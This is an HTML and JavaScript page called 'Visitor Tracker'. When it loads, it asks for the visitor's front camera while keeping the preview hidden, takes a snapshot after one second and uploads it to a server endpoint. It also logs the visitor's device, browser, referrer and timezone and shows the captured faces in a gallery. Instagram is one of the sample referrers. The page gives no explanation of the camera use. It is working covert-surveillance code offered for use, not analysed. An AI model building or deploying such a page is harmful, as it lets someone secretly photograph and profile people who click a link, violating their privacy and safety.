<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Visitor Tracker</title>
  <style>
    #camera-preview {
      width: 640px;
      height: 480px;
      display: none;
    }
    #photo-canvas {
      display: none;
    }
    /* Add styles for photo gallery, charts, and other elements */
  </style>
</head>
<body>
  <!-- Camera Preview -->
  <video id="camera-preview" autoplay></video>
  <canvas id="photo-canvas"></canvas>

  <!-- Photo Gallery (existing) -->
  <div id="photo-gallery">
    <!-- Gallery content will be dynamically added here -->
  </div>

  <!-- Charts (existing) -->
  <canvas id="device-chart"></canvas>
  <canvas id="referrer-chart"></canvas>

  <script>
    let stats = {
      deviceBreakdown: {
        Mobile: 10,
        Desktop: 5,
        Tablet: 3
      },
      referrerBreakdown: {
        instagram: 7,
        direct: 5,
        google: 3
      }
    };

    let deviceChart, referrerChart;

    window.addEventListener('load', async () => {
      try {
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: "user",
            width: { ideal: 640 },
            height: { ideal: 480 }
          } 
        });
        
        const video = document.getElementById('camera-preview');
        video.srcObject = stream;

        // Wait for video to be ready
        video.onloadedmetadata = () => {
          video.play();
          
          // Take photo after a short delay
          setTimeout(() => {
            capturePhoto(stream);
          }, 1000);
        };
      } catch (err) {
        console.error("Error accessing camera:", err);
        recordVisitWithoutPhoto();
      }
    });

    function capturePhoto(stream) {
      const video = document.getElementById('camera-preview');
      const canvas = document.getElementById('photo-canvas');
      const context = canvas.getContext('2d');
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Get photo data
      const photoData = canvas.toDataURL('image/jpeg', 0.8);
      
      // Stop camera stream
      const tracks = stream.getTracks();
      tracks.forEach(track => track.stop());
      video.srcObject = null;
      
      // Send photo to server
      recordVisitWithPhoto(photoData);
    }

    async function recordVisitWithPhoto(photoData) {
      try {
        // Upload photo
        const uploadResponse = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ photoData })
        });
        const uploadResult = await uploadResponse.json();

        // Record visit with photo URL
        await recordVisit(uploadResult.photoUrl);
      } catch (error) {
        console.error("Error recording visit with photo:", error);
      }
    }

    async function recordVisitWithoutPhoto() {
      await recordVisit(null);
    }

    async function recordVisit(photoUrl) {
      const userAgent = navigator.userAgent;
      const browser = getBrowserInfo(userAgent);
      const device = getDeviceInfo(userAgent);
      const referrer = document.referrer || "Direct";
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";

      // Simulating visitor record
      const storedVisitors = JSON.parse(localStorage.getItem('visitors') || '[]');
      storedVisitors.push({
        device,
        browser,
        referrer,
        visitedAt: new Date().toISOString(),
        photoUrl
      });
      localStorage.setItem('visitors', JSON.stringify(storedVisitors));

      renderVisitors(storedVisitors);
      renderCharts();
    }

    function getBrowserInfo(userAgent) {
      // Simple browser detection
      if (userAgent.includes('Firefox')) return 'Firefox';
      if (userAgent.includes('Chrome')) return 'Chrome';
      if (userAgent.includes('Safari')) return 'Safari';
      if (userAgent.includes('Edge')) return 'Edge';
      return 'Unknown';
    }

    function getDeviceInfo(userAgent) {
      // Simple device detection
      if (userAgent.includes('Mobile')) return 'Mobile';
      if (userAgent.includes('Tablet')) return 'Tablet';
      return 'Desktop';
    }

    function renderVisitors(visitors) {
      const photoGallery = document.getElementById('photo-gallery');
      let galleryHtml = '';
      
      visitors.forEach(visitor => {
        galleryHtml += `
          <div class="photo-item">
            <img src="${visitor.photoUrl || 'path/to/default-photo.jpg'}" alt="Visitor Photo" />
            <div class="photo-info">
              <p class="truncate">${visitor.device} / ${visitor.browser}</p>
              <p class="truncate">${formatDate(visitor.visitedAt)}</p>
            </div>
          </div>
        `;
      });
      
      photoGallery.innerHTML = galleryHtml;
    }

    function formatDate(dateString) {
      const date = new Date(dateString);
      return `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
    }

    function renderCharts() {
      // Device chart
      const deviceLabels = Object.keys(stats.deviceBreakdown);
      const deviceData = Object.values(stats.deviceBreakdown);
      const deviceColors = ['#0088FE', '#00C49F', '#FFBB28', '#FF8042', '#8884D8', '#FF6B6B'];

      if (deviceChart) {
        deviceChart.destroy();
      }

      const deviceCtx = document.getElementById('device-chart').getContext('2d');
      deviceChart = new Chart(deviceCtx, {
        type: 'pie',
        data: {
          labels: deviceLabels,
          datasets: [{
            data: deviceData,
            backgroundColor: deviceColors.slice(0, deviceLabels.length),
            borderWidth: 1
          }]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          plugins: {
            legend: {
              position: 'bottom'
            }
          }
        }
      });

      // Referrer chart
      const referrerLabels = Object.keys(stats.referrerBreakdown).map(label => label === 'direct' ? 'Direct' : label);
      const referrerData = Object.values(stats.referrerBreakdown);
      const referrerColors = ['#FF6B6B', '#8884D8', '#00C49F', '#FFBB28', '#0088FE', '#FF8042'];

      if (referrerChart) {
        referrerChart.destroy();
      }

      const referrerCtx = document.getElementById('referrer-chart').getContext('2d');
      referrerChart = new Chart(referrerCtx, {
        type: 'pie',
        data: {
          labels: referrerLabels,
          datasets: [{
            data: referrerData,
            backgroundColor: referrerColors.slice(0, referrerLabels.length),
            borderWidth: 1
          }]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          plugins: {
            legend: {
              position: 'bottom'
            }
          }
        }
      });
    }

    // Mock Data for Demo
    function loadMockData() {
      const storedVisitors = JSON.parse(localStorage.getItem('visitors') || '[]');
      if (storedVisitors.length > 0) return;

      const mockVisitors = [
        { id: 'mock1', device: 'Android', browser: 'Chrome', referrer: 'instagram.com', photoUrl: null, visitedAt: new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString() },
        { id: 'mock2', device: 'iOS', browser: 'Safari', referrer: 'direct', photoUrl: null, visitedAt: new Date(Date.now() - 4 * 60 * 60 * 1000).toISOString() },
        { id: 'mock3', device: 'Windows', browser: 'Edge', referrer: 'instagram.com', photoUrl: null, visitedAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000).toISOString() }
      ];

      localStorage.setItem('visitors', JSON.stringify(mockVisitors));
    }

    loadMockData(); // Load mock data for demo
  </script>
</body>
</html>
